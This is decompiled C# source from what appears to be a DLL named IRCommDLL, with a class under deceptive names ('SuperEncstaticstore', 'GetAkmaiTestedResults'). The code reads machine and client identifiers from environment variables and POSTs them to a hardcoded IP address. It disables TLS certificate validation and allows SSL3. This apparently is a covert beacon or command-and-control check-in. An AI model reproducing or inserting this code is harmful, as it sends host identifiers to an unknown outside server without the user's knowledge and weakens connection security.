using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace IRCommDLL;

internal class SuperEncstaticstore
{
	public static Random randomStr;

	public static string AdminId;

	public static string GetAkmaiTestedResults()
	{
		try
		{
			string variable = "mac";
			string environmentVariable = Environment.GetEnvironmentVariable(variable, EnvironmentVariableTarget.Process);
			string variable2 = "clientID";
			string environmentVariable2 = Environment.GetEnvironmentVariable(variable2, EnvironmentVariableTarget.Process);
			string[] array = new string[1];
			string text = "154.61.76.210";
			array[0] = text;
			string[] array2 = array;
			string text2 = array2[randomStr.Next(0, array2.Length)];
			string text3 = "http://";
			string text4 = "/api/line/GetSensor";
			string requestUrl = text3 + text2 + text4;
			string[] array3 = new string[5];
			string text5 = "{\"Key\":\"gadaruser_";
			array3[0] = text5;
			array3[1] = environmentVariable2;
			string text6 = "\",\"MacId\":\"gadaruser_";
			array3[2] = text6;
			array3[3] = environmentVariable;
			string text7 = "\"}";
			array3[4] = text7;
			string postedDate = string.Concat(array3);
			return invokePostRequestJson(requestUrl, postedDate, 60000);
		}
		catch (Exception ex)
		{
			string text8 = "error:";
			return text8 + ex.Message;
		}
	}

	public static string invokePostRequestJson(string requestUrl, string postedDate, int timeout = 10000)
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			HttpWebRequest httpWebRequest = WebRequest.Create(requestUrl) as HttpWebRequest;
			string contentType = "application/json";
			httpWebRequest.ContentType = contentType;
			string method = "POST";
			httpWebRequest.Method = method;
			httpWebRequest.Timeout = timeout;
			using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
			{
				streamWriter.Write(postedDate);
			}
			return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
		}
		catch (TimeoutException)
		{
			return "timeout";
		}
		catch (Exception ex2)
		{
			string text = "error:";
			return text + ex2.Message;
		}
	}

	static SuperEncstaticstore()
	{
		randomStr = new Random();
		string adminId = "SGX9777";
		AdminId = adminId;
	}
}
